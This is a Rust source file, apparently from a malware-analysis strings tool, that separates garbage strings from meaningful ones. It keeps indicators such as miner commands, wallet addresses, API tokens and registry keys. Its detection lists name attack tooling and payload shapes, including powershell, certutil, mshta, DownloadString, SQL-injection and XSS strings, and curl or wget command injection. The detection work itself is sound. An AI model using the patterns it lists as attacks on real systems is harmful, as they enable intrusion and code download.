//! String validation utilities.
//!
//! Functions for validating and filtering string candidates to remove garbage
//! and low-quality strings.

use aho_corasick::AhoCorasick;
use std::sync::LazyLock;

use crate::validation_thresholds::{
    MAX_AVG_RUN_LENGTH_CHAOS, MAX_CLASS_DOMINANCE_RATIO, MAX_HASH_LENGTH, MAX_NON_ASCII_RATIO,
    MAX_SHORT_ESCAPE_LENGTH, MAX_SPECIAL_RATIO_FOR_DOMAINS, MAX_SPECIAL_RATIO_FOR_PATHS,
    MAX_TRANSITION_RATIO, MAX_WALLET_LENGTH, MAX_WHITESPACE_RATIO, MIN_ALPHANUMERIC_RATIO,
    MIN_BASE64_LENGTH, MIN_BASE64_RATIO_FOR_KEYS, MIN_CHAOTIC_PATTERN_LENGTH,
    MIN_EMAIL_VALID_CHAR_RATIO, MIN_FAST_PATH_ALPHABETIC_RATIO, MIN_FAST_PATH_VALID_LENGTH,
    MIN_HASH_LENGTH, MIN_HEX_RATIO_FOR_HASH, MIN_LOWERCASE_RATIO_FOR_PATHS,
    MIN_NON_ASCII_ALPHABETIC_RATIO, MIN_NON_ASCII_COUNT_SHORT, MIN_SEGMENT_COUNT,
    MIN_TRANSITIONS_FOR_CHAOS, MIN_WALLET_ALPHANUMERIC_RATIO, MIN_WALLET_LENGTH,
    MIXED_CASE_DIGIT_MAX_LEN, MIXED_CASE_DIGIT_MIN_LEN, SHORT_IDENTIFIER_MAX_LEN,
    SHORT_IDENTIFIER_MIN_LEN, SHORT_NON_ASCII_CHECK_LEN,
};

/// Patterns that immediately identify miner IOC strings (pure OR match).
#[allow(clippy::expect_used)]
static MINER_PURE_OR: LazyLock<AhoCorasick> = LazyLock::new(|| {
    AhoCorasick::new([
        "stratum+tcp://",
        "stratum+ssl://",
        "xmrig",
        "xmr-stak",
        "cpuminer",
        "ccminer",
        "ethminer",
        "phoenixminer",
        "t-rex",
        "--donate-level",
        "--algo=",
        "--cuda-devices",
    ])
    .expect("valid miner patterns")
});

/// Pool-type indicators (combined with a network indicator to confirm miner IOC).
#[allow(clippy::expect_used)]
static MINER_POOL: LazyLock<AhoCorasick> = LazyLock::new(|| {
    AhoCorasick::new(["pool.", "nanopool", "minergate"]).expect("valid pool patterns")
});

/// Literal shell-command indicators, batched into one Aho-Corasick pass
/// (replaces eight independent `contains` scans in `is_shell_command_string`).
#[allow(clippy::expect_used)]
static SHELL_INDICATORS: LazyLock<AhoCorasick> = LazyLock::new(|| {
    AhoCorasick::new([
        "osascript",
        "bash",
        "/bin/sh",
        "/bin/bash",
        "2>&1",
        "<<",
        "2>/dev/null",
        "2>",
    ])
    .expect("valid shell indicator patterns")
});

/// IOC substring patterns batched into one Aho-Corasick automaton.
///
/// `is_recognized_ioc` historically did ~11 independent `s.contains(...)`
/// scans (one per needle).  For long strings that is O(11 × len).  A single
/// AC find is O(len).  The index of the matched pattern is mapped back to
/// the per-needle constraint via [`ioc_substring_match`].
#[allow(clippy::expect_used)]
static IOC_SUBSTRING: LazyLock<AhoCorasick> = LazyLock::new(|| {
    AhoCorasick::new(IOC_SUBSTRING_PATTERNS).expect("valid IOC substring patterns")
});

/// Pattern strings for [`IOC_SUBSTRING`] — order matters (the index of a
/// matched pattern is consumed by [`ioc_substring_match`] for per-pattern
/// length constraints).  Only patterns that are "match = IOC, unconditional"
/// belong here.  Compound checks (`CN=` + `DC=`) and validated checks
/// (`2>&1` requires alnum/ASCII-ratio gate) stay as explicit checks.
const IOC_SUBSTRING_PATTERNS: &[&str] = &[
    ".onion",
    "HKLM\\",
    "HKCU\\",
    "HKEY_",
    "LDAP://",
    "-----BEGIN",
    "-----END",
];

/// Length-constrained IOC-substring match.
///
/// Returns `true` if any pattern in [`IOC_SUBSTRING`] matches `s` AND the
/// per-pattern length constraint is satisfied.  Skips patterns whose
/// constraint is not met (e.g. `.onion` requires `len >= 10` so `a.onion`
/// does not count).
fn ioc_substring_match(s: &str, len: usize) -> bool {
    // `find_iter` yields all matches up to the first that satisfies its
    // constraint.  Most patterns have no length constraint, so the first
    // match short-circuits immediately.
    for m in IOC_SUBSTRING.find_iter(s) {
        match m.pattern().as_usize() {
            0 => {
                // `.onion` requires host+TLD, so total length >= 10
                if len >= 10 {
                    return true;
                }
            }
            _ => return true,
        }
    }
    false
}

/// Code/script patterns that immediately mark a string as non-garbage (pure OR match).
#[allow(clippy::expect_used)]
static CODE_PATTERNS: LazyLock<AhoCorasick> = LazyLock::new(|| {
    AhoCorasick::new([
        "__attribute__",
        "#define",
        "#include",
        "eval(",
        "base64_decode(",
        "$_GET",
        "$_POST",
        "$_SERVER",
        "$_COOKIE",
        "$GLOBALS",
        "preg_replace(",
        "pack(",
        "$ARGV",
        "${IFS}",
        "schtasks",
        "net user",
        "reg add",
        "powershell",
        "certutil",
        "mshta",
        "IEX(",
        "DownloadString",
    ])
    .expect("valid code patterns")
});

fn is_crypto_wallet_address(s: &str, len: usize) -> bool {
    if !(MIN_WALLET_LENGTH..=MAX_WALLET_LENGTH).contains(&len) {
        return false;
    }
    let looks_like_crypto = (s.starts_with('1') || s.starts_with('3'))
        || s.starts_with("bc1")
        || (s.starts_with("0x") && len == 42)
        || ((s.starts_with('4') || s.starts_with('8')) && len >= 90)
        || (s.starts_with('L') || s.starts_with('M'))
        || s.starts_with('D');
    if !looks_like_crypto {
        return false;
    }
    let alnum_count = s.bytes().filter(u8::is_ascii_alphanumeric).count();
    alnum_count * 100 / len >= MIN_WALLET_ALPHANUMERIC_RATIO
}

fn is_miner_ioc(s: &str) -> bool {
    if MINER_PURE_OR.is_match(s) {
        return true;
    }
    if MINER_POOL.is_match(s)
        && (s.contains(".com")
            || s.contains(".org")
            || memchr::memchr(b':', s.as_bytes()).is_some())
    {
        return true;
    }
    s.contains("-o ") && s.contains("-u ")
}

/// String of length ≥8 composed entirely of `[0-9a-fA-F:-]`, with at
/// least 6 hex digits drawn from ≥4 distinct hex characters. Catches
/// UUIDs, MD5/SHA hashes, MAC addresses, IPv6 address fragments,
/// OpenSSH key fingerprints, and build IDs that the statistical filter
/// would otherwise drop as chaotic. The diversity floor rejects
/// degenerate same-char runs like `aaaaaaaa` or `12121212`.
fn is_hex_id_run(s: &str, len: usize) -> bool {
    if len < 8 {
        return false;
    }
    let mut hex = 0usize;
    let mut seen: u16 = 0;
    for b in s.bytes() {
        let v = match b {
            b'0'..=b'9' => b - b'0',
            b'a'..=b'f' => b - b'a' + 10,
            b'A'..=b'F' => b - b'A' + 10,
            b':' | b'-' => continue,
            _ => return false,
        };
        hex += 1;
        seen |= 1u16 << v;
    }
    hex >= 6 && seen.count_ones() >= 4
}

/// String of length ≥12 composed entirely of base64 and base64url
/// alphabet characters (`[A-Za-z0-9+/=_-]`) with ≥6 distinct
/// characters. Catches opaque API tokens, short b64 payloads, AES keys,
/// and other token-shaped IDs the chaos filter would otherwise drop.
/// The diversity floor rejects degenerate runs like `aaaaaaaaaaaa`.
fn is_token_id_run(s: &str, len: usize) -> bool {
    if len < 12 {
        return false;
    }
    let mut seen: u128 = 0;
    for b in s.bytes() {
        let in_set = matches!(b,
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9'
            | b'+' | b'/' | b'=' | b'_' | b'-'
        );
        if !in_set {
            return false;
        }
        seen |= 1u128 << (b - 0x20);
    }
    seen.count_ones() >= 6
}

fn is_ctf_or_guid(s: &str, len: usize) -> bool {
    if !s.starts_with('{') || !s.ends_with('}') {
        return false;
    }
    if len > 5
        && (s.contains("CTF{")
            || s.contains("flag{")
            || s.contains("FLAG{")
            || s.contains("picoCTF{")
            || s.contains("HTB{"))
    {
        return true;
    }
    if (36..=38).contains(&len) {
        let dash_count = memchr::memchr_iter(b'-', s.as_bytes()).count();
        let hex_count = s.bytes().filter(u8::is_ascii_hexdigit).count();
        if dash_count == 4 && (30..=32).contains(&hex_count) {
            return true;
        }
    }
    false
}

fn is_email_address(s: &str, len: usize) -> bool {
    if !s.contains('@') || !s.contains('.') || len < 6 {
        return false;
    }
    let at_count = memchr::memchr_iter(b'@', s.as_bytes()).count();
    let dot_count = memchr::memchr_iter(b'.', s.as_bytes()).count();
    if at_count != 1 || dot_count < 1 {
        return false;
    }
    let valid_chars = s
        .chars()
        .filter(|c| c.is_alphanumeric() || matches!(c, '@' | '.' | '-' | '_' | '+'))
        .count();
    valid_chars * 100 / len >= MIN_EMAIL_VALID_CHAR_RATIO
}

fn is_jwt_token(s: &str, len: usize) -> bool {
    if s.matches('.').count() != 2 || len < 50 {
        return false;
    }
    // Exactly three segments guaranteed above; none may be empty.
    if s.split('.').any(str::is_empty) {
        return false;
    }
    // Every real JWT header is `{"alg":...}` → base64url `eyJ`. The prefix
    // keeps arbitrary `foo.bar.baz`-shaped identifiers out.
    if !s.starts_with("eyJ") {
        return false;
    }
    let base64_chars = s
        .chars()
        .filter(|c| c.is_alphanumeric() || matches!(c, '.' | '-' | '_' | '='))
        .count();
    base64_chars * 100 / len >= 95
}

/// Telegram bot API token: `<bot_id>:<auth_token>`.
///
/// Official shape (docs + observed rotations): bot_id is 8–16 ASCII digits,
/// auth_token is 30–48 chars drawn from the base64url alphabet
/// (`[A-Za-z0-9_-]`). The chaos filter otherwise drops these because digits
/// → `:` → upper → lower → `-` flips character class on almost every byte.
fn is_telegram_bot_token(s: &str, len: usize) -> bool {
    if !(40..=80).contains(&len) {
        return false;
    }
    let Some(colon) = memchr::memchr(b':', s.as_bytes()) else {
        return false;
    };
    let (id, rest) = s.split_at(colon);
    let body = &rest[1..];
    if !(8..=16).contains(&id.len()) || !id.bytes().all(|b| b.is_ascii_digit()) {
        return false;
    }
    if !(30..=64).contains(&body.len()) {
        return false;
    }
    body.bytes()
        .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'-' | b'_'))
}

/// Swift mangled symbol name.
///
/// Covers the stable ABI prefixes seen in Mach-O `__TEXT` sections:
///   * `_Tt*` — Swift 1–3 type metadata (`_TtC…`, `_TtP…`, `_TtV…`, `_TtO…`)
///   * `_T0*` — Swift 4
///   * `_$s*` / `$s*` — Swift 5 stable ABI
///   * `_$S*` / `$S*` — Swift 4.2 transitional ABI
///
/// The mangling alphabet is alphanumerics plus `_` and `$`, so we gate on
/// prefix + near-pure alphabet to avoid matching random `_T`-prefixed text.
fn is_swift_mangled_symbol(s: &str, len: usize) -> bool {
    if len < 8 {
        return false;
    }
    let has_prefix = s.starts_with("_Tt")
        || s.starts_with("_T0")
        || s.starts_with("_$s")
        || s.starts_with("_$S")
        || s.starts_with("$s")
        || s.starts_with("$S");
    if !has_prefix {
        return false;
    }
    // Swift's mangling alphabet is strictly [A-Za-z0-9_$]. Any other byte
    // means the string isn't a mangled symbol (likely a path fragment or
    // identifier that happens to share the prefix).
    s.bytes()
        .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'$'))
}

fn is_attack_payload(s: &str) -> bool {
    if (s.contains("' OR '") || s.contains("1'='1"))
        || (s.contains("UNION") && s.contains("SELECT"))
        || s.contains("admin'--")
    {
        return true;
    }
    (s.contains("<script>") && s.contains("</script>"))
        || (s.contains("onerror=") && s.contains("alert("))
        || s.starts_with("javascript:")
}

fn is_api_key_pattern(s: &str, len: usize) -> bool {
    let matches_prefix = (s.starts_with("AKIA") && len >= 20)
        || (s.starts_with("ghp_") && len >= 36)
        || (s.starts_with("sk_live_") || s.starts_with("pk_live_"))
        || (s.starts_with("xox") && len >= 30);
    if !matches_prefix {
        return false;
    }
    let alnum_count = s
        .chars()
        .filter(|c| c.is_alphanumeric() || *c == '_')
        .count();
    alnum_count * 100 / len >= MIN_BASE64_RATIO_FOR_KEYS
}

fn is_code_pattern(s: &str) -> bool {
    if CODE_PATTERNS.is_match(s) {
        return true;
    }
    // C/C++ compound patterns
    if (s.contains("char *") && s.contains("0x"))
        || (s.contains("((") && s.contains("))") && s.contains("0x"))
    {
        return true;
    }
    // PHP/shell compound patterns
    if (s.starts_with("${") && s.contains('}'))
        || (s.contains("open(") && s.contains('|'))
        || (s.contains("$(") && s.contains(')'))
        || (s.contains("eval") && (s.contains("base64") || s.contains("echo")))
    {
        return true;
    }
    // Command injection
    if (s.contains("; ") && (s.contains("cat") || s.contains("wget") || s.contains("curl")))
        || (s.contains("| ") && (s.contains("whoami") || s.contains("id") || s.contains("uname")))
        || (s.starts_with('`') && s.ends_with('`'))
    {
        return true;
    }
    // Ransom note patterns
    if s.contains("ENCRYPTED") || s.contains("DECRYPT") || s.contains("Bitcoin") {
        let uppercase_count = s.bytes().filter(u8::is_ascii_uppercase).count();
        if !s.is_empty() && uppercase_count * 100 / s.len() > 50 {
            return true;
        }
    }
    false
}

fn is_obfuscated_js(s: &str) -> bool {
    // Check for JS obfuscation patterns like _0x1234 or 0x1234
    // Must be followed by hex digits to avoid false positives from binary garbage
    let has_0x_pattern = s.contains("_0x")
        || s.as_bytes()
            .windows(3)
            .any(|w| w[0] == b'0' && w[1] == b'x' && w[2].is_ascii_hexdigit());

    if !has_0x_pattern || s.len() < 10 {
        return false;
    }

    // Also require ASCII-only content (JS is ASCII)
    // Any non-ASCII characters indicate this is not obfuscated JS
    if !s.is_ascii() {
        return false;
    }

    let has_keywords = s.contains("function")
        || s.contains("const")
        || s.contains("var")
        || s.contains("let")
        || s.contains("return")
        || s.contains("if");
    let has_code_syntax = s.contains('(') || s.contains('[') || s.contains('{');
    let hex_id_count = s.matches("_0x").count() + s.matches("0x").count();
    if has_keywords || has_code_syntax || hex_id_count >= 2 {
        let alnum_count = s.bytes().filter(u8::is_ascii_alphanumeric).count();
        if alnum_count >= 6 {
            return true;
        }
    }
    false
}

fn is_comma_separated_list(s: &str, len: usize) -> bool {
    if !s.contains(',') || len < 10 {
        return false;
    }
    let parts: Vec<&str> = s.split(',').collect();
    if parts.len() < 2 {
        return false;
    }
    let valid_parts = parts
        .iter()
        .filter(|p| {
            !p.is_empty()
                && p.chars()
                    .all(|c| c.is_alphanumeric() || c == '-' || c == '_' || c == '.')
        })
        .count();
    valid_parts * 100 / parts.len() >= 75
}

fn is_shell_command_string(s: &str) -> bool {
    let has_shell_indicator = SHELL_INDICATORS.is_match(s)
        || (s.contains(" sh ") || s.starts_with("sh ") || s.ends_with(" sh"));
    if !has_shell_indicator {
        return false;
    }
    let special_count = s
        .chars()
        .filter(|c| !c.is_alphanumeric() && !c.is_whitespace())
        .count();
    let alnum_count = s.bytes().filter(u8::is_ascii_alphanumeric).count();
    if s.is_empty() {
        return false;
    }
    alnum_count * 100 / s.len() >= 40 && special_count <= alnum_count
}

fn is_mac_address_or_ipv6(s: &str, len: usize) -> bool {
    // MAC addresses
    if (12..=17).contains(&len) {
        let colon_count = memchr::memchr_iter(b':', s.as_bytes()).count();
        let dash_count = memchr::memchr_iter(b'-', s.as_bytes()).count();
        let dot_count = memchr::memchr_iter(b'.', s.as_bytes()).count();
        let hex_count = s.bytes().filter(u8::is_ascii_hexdigit).count();
        if (colon_count == 5 || dash_count == 5) && hex_count == 12 {
            return true;
        }
        if dot_count == 2 && hex_count == 12 {
            return true;
        }
    }
    // IPv6
    if len >= 3 && s.contains(':') {
        let colon_count = memchr::memchr_iter(b':', s.as_bytes()).count();
        let hex_count = s.bytes().filter(u8::is_ascii_hexdigit).count();
        if colon_count >= 2 && hex_count >= 1 {
            // Reject trailing colons (invalid IPv6, unless ::)
            if s.ends_with(':') && !s.ends_with("::") {
                return false;
            }
            // Reject leading colons (invalid unless ::)
            if s.starts_with(':') && !s.starts_with("::") {
                return false;
            }
            // Reject 3+ consecutive colons (only :: is valid)
            if s.contains(":::") {
                return false;
            }
            // Reject multiple :: occurrences
            if s.matches("::").count() > 1 {
                return false;
            }
            let hex_and_colon = s
                .chars()
                .filter(|c| c.is_ascii_hexdigit() || *c == ':' || *c == '.')
                .count();
            if hex_and_colon * 100 / len > 80 {
                return true;
            }
        }
    }
    false
}

fn is_locale_code(s: &str, len: usize) -> bool {
    if len != 5 && len != 6 {
        return false;
    }
    // Locale codes are always ASCII (e.g. "en_US", "zh_CN", "eng_US")
    let b = s.as_bytes();
    (b[0].is_ascii_lowercase()
        && b[1].is_ascii_lowercase()
        && b[2] == b'_'
        && b[3].is_ascii_uppercase()
        && b[4].is_ascii_uppercase())
        || (len == 6
            && b[0].is_ascii_lowercase()
            && b[1].is_ascii_lowercase()
            && b[2].is_ascii_lowercase()
            && b[3] == b'_'
            && b[4].is_ascii_uppercase()
            && b[5].is_ascii_uppercase())
}

struct CharStats {
    upper: usize,
    lower: usize,
    digit: usize,
    alpha: usize,
    whitespace: usize,
    noise_punct: usize,
    open_parens: usize,
    close_parens: usize,
    quotes: usize,
    special: usize,
    hex_only: usize,
    ascii_count: usize,
    alternations: usize,
    first_char: char,
    last_char: char,
    all_same: bool,
    has_non_hex_letter: bool,
    alphanumeric: usize,
    char_count: usize,
}

impl CharStats {
    fn from_str(s: &str) -> Self {
        let mut upper = 0usize;
        let mut lower = 0usize;
        let mut digit = 0usize;
        let mut alpha = 0usize;
        let mut whitespace = 0usize;
        let mut noise_punct = 0usize;
        let mut open_parens = 0usize;
        let mut close_parens = 0usize;
        let mut quotes = 0usize;
        let mut special = 0usize;
        let mut hex_only = 0usize;
        let mut ascii_count = 0usize;
        let mut alternations = 0usize;
        let mut prev_is_digit: Option<bool> = None;
        let mut first_char_opt: Option<char> = None;
        let mut all_same = true;
        let mut last_char = '\0';
        let mut has_non_hex_letter = false;
        let mut char_count = 0usize;

        for c in s.chars() {
            char_count += 1;
            if first_char_opt.is_none() {
                first_char_opt = Some(c);
            } else if all_same && Some(c) != first_char_opt {
                all_same = false;
            }
            last_char = c;

            if c.is_ascii() {
                ascii_count += 1;
            }

            if c.is_ascii_uppercase() {
                upper += 1;
                alpha += 1;
                if !c.is_ascii_hexdigit() {
                    has_non_hex_letter = true;
                }
                hex_only += 1;
                if prev_is_digit == Some(true) {
                    alternations += 1;
                }
                prev_is_digit = Some(false);
            } else if c.is_ascii_lowercase() {
                lower += 1;
                alpha += 1;
                if !c.is_ascii_hexdigit() {
                    has_non_hex_letter = true;
                }
                hex_only += 1;
                if prev_is_digit == Some(true) {
                    alternations += 1;
                }
                prev_is_digit = Some(false);
            } else if c.is_ascii_digit() {
                digit += 1;
                hex_only += 1;
                if prev_is_digit == Some(false) {
                    alternations += 1;
                }
                prev_is_digit = Some(true);
            } else if c.is_alphabetic() {
                alpha += 1;
                if prev_is_digit == Some(true) {
                    alternations += 1;
                }
                prev_is_digit = Some(false);
            } else if c.is_whitespace() {
                whitespace += 1;
            } else {
                match c {
                    '#' | '@' | '?' | '>' | '<' | '|' | '\\' | '^' | '`' | '~' | '$' | '+'
                    | '&' | '*' | '=' | ';' | ':' | '!' | ',' => noise_punct += 1,
                    '(' | '[' | '{' => open_parens += 1,
                    ')' | ']' | '}' => close_parens += 1,
                    '"' | '\'' => quotes += 1,
                    _ => {}
                }
                if !c.is_alphanumeric() && !c.is_whitespace() {
                    special += 1;
                }
            }
        }

        let first_char = first_char_opt.unwrap_or(' ');
        let alphanumeric = alpha + digit;

        Self {
            upper,
            lower,
            digit,
            alpha,
            whitespace,
            noise_punct,
            open_parens,
            close_parens,
            quotes,
            special,
            hex_only,
            ascii_count,
            alternations,
            first_char,
            last_char,
            all_same,
            has_non_hex_letter,
            alphanumeric,
            char_count,
        }
    }
}

/// Returns true if a very short string (2-6 chars) looks like random binary garbage.
fn is_short_identifier_garbage(s: &str, len: usize, stats: &CharStats) -> bool {
    if !(SHORT_IDENTIFIER_MIN_LEN..=SHORT_IDENTIFIER_MAX_LEN).contains(&len) {
        return false;
    }
    let is_all_upper = stats.upper == len;
    let is_all_lower = stats.lower == len;
    let is_all_digit = stats.digit == len;
    // Digit + uppercase patterns like "8BIM", "3DES" are valid
    // But single leading 0 or 1 is suspicious (real identifiers use meaningful numbers)
    let chars: Vec<char> = s.chars().collect();
    let has_suspicious_leading_digit = (stats.first_char == '0' || stats.first_char == '1')
        && chars.len() > 1
        && !chars[1].is_ascii_digit(); // Single 0 or 1 at start, not part of larger number
    let is_digit_upper_id = stats.first_char.is_ascii_digit()
        && stats.upper > 0
        && stats.lower == 0
        && stats.special == 0
        && !has_suspicious_leading_digit
        && s.chars()
            .skip_while(char::is_ascii_digit)
            .all(|c| c.is_ascii_uppercase());
    let is_pascal_case = stats.first_char.is_ascii_uppercase()
        && stats.upper == 1
        && stats.lower > 0
        && stats.digit == 0;
    let last_char = stats.last_char;
    // camelCase identifiers: lowercase first char, exactly one uppercase
    // somewhere in the middle, lowercase tail. At 4+ chars this matches
    // short brand/Hungarian names (`iPad`, `iMac`, `hWnd`, `lpSz`) — the
    // 7-char floor used to filter these out alongside actual noise.
    let is_camel_case = len >= 4
        && stats.first_char.is_ascii_lowercase()
        && stats.upper == 1
        && stats.digit == 0
        && !last_char.is_ascii_uppercase();
    let is_lower_with_suffix = stats.first_char.is_ascii_lowercase()
        && stats.lower > 0
        && stats.upper == 0
        && stats.digit > 0
        && last_char.is_ascii_digit();

    // Alphanumeric identifiers with consistent case are usually valid:
    // - File signatures: "BSJB", "RIFF", "8BIM"
    // - Algorithms/encodings: "UTF8", "SHA256", "BASE64", "UTF16LE"
    // - Architecture names: "amd64", "arm64"
    // Rule: 4-8 chars, alphanumeric only, letters in consistent case,
    // and doesn't have digits at BOTH ends (like "0YI0" which is garbage),
    // and doesn't have single 0 or 1 as leading digit (handled by has_suspicious_leading_digit above)
    let is_consistent_case_alphanum = (4..=8).contains(&len)
        && stats.special == 0
        && stats.digit > 0
        && stats.alpha > 0
        && (stats.lower == 0 || stats.upper == 0)
        && !(stats.first_char.is_ascii_digit() && stats.last_char.is_ascii_digit())
        && !has_suspicious_leading_digit;

    // Check for consonant-only strings (no vowels) - likely random garbage
    // unless it's a known pattern like "str", "ptr", "chr", "src", etc.
    if is_all_lower && len >= 4 {
        let vowel_count = s
            .bytes()
            .filter(|&b| matches!(b, b'a' | b'e' | b'i' | b'o' | b'u'))
            .count();
        if vowel_count == 0 {
            // Whitelist common consonant-only strings
            let known = [
                "str", "ptr", "chr", "src", "dst", "tmp", "prn", "sys", "cfg", "mgr", "ctx",
            ];
            if !known.contains(&s) {
                return true;
            }
        }
    }

    if is_all_upper
        || is_all_lower
        || is_all_digit
        || is_digit_upper_id
        || is_pascal_case
        || is_camel_case
        || is_lower_with_suffix
        || is_consistent_case_alphanum
    {
        return false;
    }
    // Identifier-shaped alphanumeric strings (`iPad`, `hWnd`, `Argon2`) have
    // a same-class run of ≥ 2 even at 4–6 chars and should be kept.
    if looks_like_word_like(s, len, stats) {
        return false;
    }
    // Short multi-word fragments (`JMP +5`) — at least 4 alphanumeric chars
    // with whitespace separating tokens. Garbage like `5c 9` or `VW N` has
    // too few alphanumeric chars to clear this bar.
    if stats.whitespace > 0 && stats.alphanumeric >= 4 {
        return false;
    }
    if stats.digit > 0 && (stats.upper > 0 || stats.lower > 0) {
        return true;
    }
    if stats.upper > 0 && stats.lower > 0 {
        return true;
    }
    if stats.whitespace > 0 {
        return true;
    }
    false
}

/// Returns true if a short string (<=6 chars) looks like misaligned binary data.
fn is_short_binary_garbage(s: &str, len: usize, stats: &CharStats) -> bool {
    if len > 6 {
        return false;
    }
    // All-uppercase + punctuation is usually misaligned binary (`MD%`, `AB#`).
    // Whitespace flips the meaning — `JMP +5` is a disassembly fragment, not
    // noise, so a multi-word string with this shape is kept.
    if stats.upper > 0 && stats.special > 0 && stats.alpha == stats.upper && stats.whitespace == 0 {
        return true;
    }
    if stats.special > 0 && len <= 5 {
        // Function-call shapes (`Run()`, `F(x)`, `fn()`) are meaningful code
        // even at short lengths. Balanced parens accounting for every special
        // char is a strong signal.
        let is_function_call = stats.open_parens > 0
            && stats.open_parens == stats.close_parens
            && stats.open_parens + stats.close_parens == stats.special
            && stats.alphanumeric > 0;
        if is_function_call {
            return false;
        }
        let dot_count = memchr::memchr_iter(b'.', s.as_bytes()).count();
        if dot_count == stats.special {
            let is_filename_pattern =
                (dot_count == 1 && !s.starts_with('.') && !s.ends_with('.')) || s.starts_with('.');
            if !is_filename_pattern || stats.alphanumeric == 0 {
                return true;
            }
        } else {
            return true;
        }
    }
    false
}

/// Detect x86-64 register save/restore byte sequences that decoded as
/// printable ASCII when the string scanner read them out of `.text`.
///
/// Function prologues that save callee-saved registers r12-r15 emit
/// `41 54 41 55 41 56 41 57` (`push r12 … push r15`), which the scanner
/// reads as the literal text `ATAUAVAW`.  Epilogue / REX-prefix
/// combinations yield variants like `AVAUATSH`, `AWAVAUATL`, `AXAY`.
/// These are scattered throughout `.text` of any non-trivial binary
/// and dominate the strings list with no analytic value.
///
/// Two-tier detection:
///
/// * **Multi-pair (high confidence):** ≥2 occurrences of byte `0x41`
///   (`A`, the REX.B prefix) followed by a push/pop opcode byte
///   (`0x50-0x5F`, `P-_`).  No real string contains two `A`+pushpop
///   pairs — they only arise from saving / restoring extended r8-r15
///   registers in succession.
/// * **Single-pair + digit at length 4 (medium confidence):** exactly
///   one such pair, has a digit, and every byte is in the x86 opcode
///   range `0x30-0x39 ∪ 0x40-0x5F`.  Catches short fragments like
///   `AWE1`, `7ARI`.  Length cap to 4 keeps common architecture /
///   protocol identifiers (`ARM64`, `AMD64`, `APRIL1`) safe.
///
/// Magic numbers stay safe because they neither contain ≥2 REX-pairs
/// nor (at length 4 with a digit) start at byte 0x41 followed by an
/// opcode byte: `BSJB`, `RIFF`, `RSDS`, `8BIM`, `IDAT`, `IHDR`, `IEND`,
/// `MSCF`, `EXIF`, `DICM`, `COFF`, `CAFE`, `BEEF`, `DEAD`, `FEED` all
/// pass through.
///
/// **Scoping:** the rule is x86-only (REX prefix is x86-64 instruction
/// encoding) and code-only (asm fragments leak from `.text`-like
/// sections, never from `.rodata`/`.data`/`.symtab`/etc.).  A
/// `StringContext` with `arch == Some(non-x86)` or
/// `section == Some(non_code_section)` skips the rule entirely; an
/// empty context (`None`/`None`) preserves the legacy "apply globally"
/// behavior for callers that don't know their input.
///
/// **Known false positives** (only when the rule actually runs): rare
/// English words / proper nouns that happen to decode as multiple
/// REX-pairs — `ATLAS` (`AT`, `AS`), `AVATAR` (`AV`, `AT`, `AR`).
/// Accepted cost of a byte-level heuristic; a binary that genuinely
/// embeds the literal token `ATLAS` typically does so inside a longer
/// string ("ATLAS connect failed") that the scanner extracts as a
/// single unit, not as the isolated 5-byte word.
fn is_x86_save_sequence_fragment(
    s: &str,
    len: usize,
    stats: &CharStats,
    ctx: &crate::types::StringContext<'_>,
) -> bool {
    // Architecture scoping: skip when the caller has confirmed the
    // binary is non-x86. `None` means "unknown" — we still run the
    // rule because most binaries today are x86-family.
    if let Some(arch) = ctx.arch
        && !arch.is_x86_family()
    {
        return false;
    }

    // Section scoping: REX-prefix + push/pop bytes only originate in
    // executable sections. When the caller has tagged the source
    // section, restrict the rule to known code sections; an unknown
    // (`None`) section still runs the rule.
    if let Some(section) = ctx.section
        && !is_code_section(section)
    {
        return false;
    }

    if !(4..=12).contains(&len) {
        return false;
    }
    // Asm fragments are uppercase + digits, no lowercase / whitespace
    // / punctuation. Real text gets handled elsewhere.
    if stats.lower > 0 || stats.whitespace > 0 || stats.special > 0 {
        return false;
    }

    let bytes = s.as_bytes();

    // Count REX.B + push/pop pairs (`A` = 0x41, push/pop = 0x50-0x5F).
    let rex_pairs = bytes
        .windows(2)
        .filter(|w| w[0] == b'A' && (0x50..=0x5F).contains(&w[1]))
        .count();

    if rex_pairs >= 2 {
        return true;
    }

    if rex_pairs == 1 && len == 4 && stats.digit > 0 {
        let all_in_asm_range = bytes
            .iter()
            .all(|&b| (0x30..=0x39).contains(&b) || (0x40..=0x5F).contains(&b));
        if all_in_asm_range {
            return true;
        }
    }

    false
}

/// Recognise the executable / code-section names that asm-fragment
/// strings can leak from. Covers ELF (`.text` and per-function
/// variants like `.text.startup`, `.text.hot`), PE / Windows (`.text`,
/// `CODE`), and Mach-O (`__text`, `__TEXT.__text`).  Anything else is
/// treated as data — the asm filter won't fire there.
fn is_code_section(section: &str) -> bool {
    if section.starts_with(".text.") {
        return true;
    }
    matches!(
        section,
        ".text" | "__text" | "__TEXT.__text" | "__TEXT,__text" | "CODE" | ".code" | "code"
    )
}

/// Detect PE relocation table patterns like "xçx&xìxÇx..." or "uHu}uQu\uYu0u"
/// where a single lowercase letter repeats frequently with other characters between.
fn is_reloc_table_pattern(s: &str, len: usize) -> bool {
    if len < 8 {
        return false;
    }

    // Count frequency of each lowercase letter
    let mut letter_counts = [0u32; 26];
    let mut non_ascii_count = 0usize;
    let mut special_count = 0usize;
    let mut uppercase_count = 0usize;
    let mut digit_count = 0usize;
    let mut char_count = 0usize;

    for c in s.chars() {
        char_count += 1;
        if c.is_ascii_lowercase() {
            letter_counts[(c as u8 - b'a') as usize] += 1;
        } else if !c.is_ascii() {
            non_ascii_count += 1;
        } else if c.is_ascii_uppercase() {
            uppercase_count += 1;
        } else if c.is_ascii_digit() {
            digit_count += 1;
        } else if !c.is_alphanumeric() {
            special_count += 1;
        }
    }

    if char_count < 6 {
        return false;
    }

    // Find the most frequent lowercase letter
    let max_letter_count = letter_counts.iter().max().copied().unwrap_or(0) as usize;

    // If a single letter appears very frequently (>25% of chars) AND
    // there are non-ASCII or special chars, it's likely a reloc pattern
    // e.g., "x xçx&xìxÇx..." has 'x' appearing ~50% of the time
    if max_letter_count >= 4
        && max_letter_count * 100 / char_count >= 25
        && (non_ascii_count >= 2 || (non_ascii_count >= 1 && special_count >= 2))
    {
        return true;
    }

    // All-ASCII reloc patterns: a single lowercase letter dominates with
    // uppercase letters, digits, and special chars like {, }, \, ^
    // e.g., "uHu}uQu\uYu0u", "t{t\tYt0t8t"
    // Key: one letter > 35% of chars, mixed with uppercase/digits/special
    if max_letter_count >= 3
        && max_letter_count * 100 / char_count >= 35
